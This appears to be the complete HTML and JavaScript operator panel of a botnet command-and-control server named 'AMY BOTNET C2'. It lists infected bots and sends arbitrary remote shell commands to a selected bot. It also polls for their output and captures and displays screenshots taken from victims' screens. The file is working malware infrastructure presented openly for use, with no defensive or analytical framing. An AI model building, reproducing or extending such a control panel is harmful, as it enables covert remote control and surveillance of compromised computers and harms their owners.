<!DOCTYPE html>
<html>
<head>
    <title>AMY BOTNET C2</title>
    <style>
        body { background: #050505; color: #ff3333; font-family: monospace; padding: 20px; }
        .grid { display: grid; grid-template-columns: 250px 1fr; gap: 20px; }
        .panel { border: 1px solid #440000; padding: 15px; background: #0a0a0a; position: relative; }
        .bot { padding: 8px; border-bottom: 1px solid #220000; cursor: pointer; }
        .bot:hover { background: #220000; }
        .bot.selected { background: #ff3333; color: #000; }
        input { background: #000; border: 1px solid #ff3333; color: #0f0; padding: 8px; width: 95%; margin-bottom: 10px; }
        button { background: #ff3333; color: #000; border: none; padding: 12px; width: 100%; cursor: pointer; font-weight: bold; margin-bottom: 5px; }
        #output { background: #000; color: #0f0; border: 1px solid #111; padding: 10px; height: 300px; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; }
        #scr-viewer { display:none; position:fixed; top:5%; left:10%; width:80%; height:80%; border:2px solid #ff3333; background:#000; z-index:100; text-align:center; padding:10px; box-shadow: 0 0 50px #ff0000;}
        #scr-viewer img { max-width: 100%; max-height: 90%; border: 1px solid #333; }
    </style>
</head>
<body>
    <h1>AMY BOTNET C2</h1>
    <div id="scr-viewer">
        <button onclick="document.getElementById('scr-viewer').style.display='none'" style="width:100px; float:right;">CLOSE [X]</button>
        <h3 id="scr-title">Last Screenshot From Target</h3>
        <img id="scr-img" src="">
    </div>
    <div class="grid">
        <div class="panel">
            <h3>Bots (<span id="cnt">0</span>)</h3>
            <div id="blist"></div>
        </div>
        <div class="panel">
            <h3>Control</h3>
            <input type="text" id="bid" placeholder="Bot ID" readonly>
            <input type="text" id="cmd" value="shell:ls -la">
            <button onclick="send()">EXECUTE COMMAND</button>
            <button onclick="send('screenshot')" style="background:#880000; color:white;">TAKE SCREENSHOT</button>
            <div id="output">Terminal ready...</div>
        </div>
    </div>

    <script>
        let sel = "";
        async function refresh() {
            const r = await fetch('/bots');
            const d = await r.json();
            document.getElementById('cnt').innerText = d.bots.length;
            const list = document.getElementById('blist');
            list.innerHTML = "";
            d.bots.forEach(id => {
                const div = document.createElement('div');
                div.className = 'bot' + (id === sel ? ' selected' : '');
                div.innerText = id;
                div.onclick = () => { sel = id; document.getElementById('bid').value = id; refresh(); };
                list.appendChild(div);
            });
        }

        async function send(forceCmd = null) {
            if(!sel) return alert("Select a bot!");
            const cmd = forceCmd || document.getElementById('cmd').value;
            const out = document.getElementById('output');
            out.innerText += `\n> Executing: ${cmd}...`;
            
            await fetch(`/command?bot_id=${sel}&command=${cmd}`, {method: 'POST'});
            
            const poll = setInterval(async () => {
                const r = await fetch(`/response/${sel}`);
                const d = await r.json();
                if(d.response && d.response !== "Waiting for bot...") {
                    if(d.is_img || d.response === "SCREENSHOT_LOADED") {
                        out.innerText += `\n[SUCCESS] Image received.`;
                        const img = document.getElementById('scr-img');
                        // Додаємо таймштамп, щоб браузер не брав стару картинку з кешу
                        img.src = `/view_screenshot/${sel}?cache=` + Math.random();
                        document.getElementById('scr-viewer').style.display = 'block';
                    } else {
                        out.innerText += `\n[RESPONSE]:\n${d.response}`;
                    }
                    out.scrollTop = out.scrollHeight;
                    clearInterval(poll);
                }
            }, 1000);
        }

        setInterval(refresh, 3000);
        refresh();
    </script>
</body>
</html>
